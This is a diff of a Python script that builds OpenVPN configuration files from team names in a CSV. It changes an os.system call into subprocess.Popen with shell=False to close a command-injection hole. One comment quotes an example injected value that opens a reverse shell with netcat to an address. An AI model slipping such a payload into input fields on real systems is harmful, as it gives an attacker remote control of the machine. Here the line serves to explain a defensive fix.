@@ -8,7 +8,8 @@ clients_list = sys.argv[1]
 
 
 # please sanitize the shit out of the CSV file especially from command injections
-# if "Team Name" had a something like "&& nc -e /bin/sh 10.0.0.1 4444" then you're f**ked	
+# if "Team Name" had a something like "&& nc -e /bin/sh 10.0.0.1 4444" then you're f**ked
+# Ignore the above line the problem was solved using subproces.Popen() with shell=False
 
 with open(clients_list, mode='r') as csv_file:
 	csv_reader = csv.DictReader(csv_file)
@@ -27,13 +28,13 @@ with open(clients_list, mode='r') as csv_file:
 		
 
 		# reminder to sanitize the csv file from command injections
-		#os.system(f'bash batch-openvpn.sh {team_name} > /dev/null 2>&1')
+		# os.system(f'bash batch-openvpn.sh {team_name} > /dev/null 2>&1')
 
 		# this solves command injection vuln
 		subprocess.Popen(['bash', 'batch-openvpn.sh', team_name], shell=False)
 
 		
-		success = "\033[92m SUCCESS!!\033[00m" if os.path.exists(f'/home/silver/{team_name}.ovpn') else "\033[91m FAIL!! \033[00m"
+		success = "\033[92m SUCCESS!!\033[00m" if os.path.exists(f'{os.environ['HOME']}/{team_name}.ovpn') else "\033[91m FAIL!! \033[00m"
 		print(f'Created {team_name:<25s}		{success}')
 
 
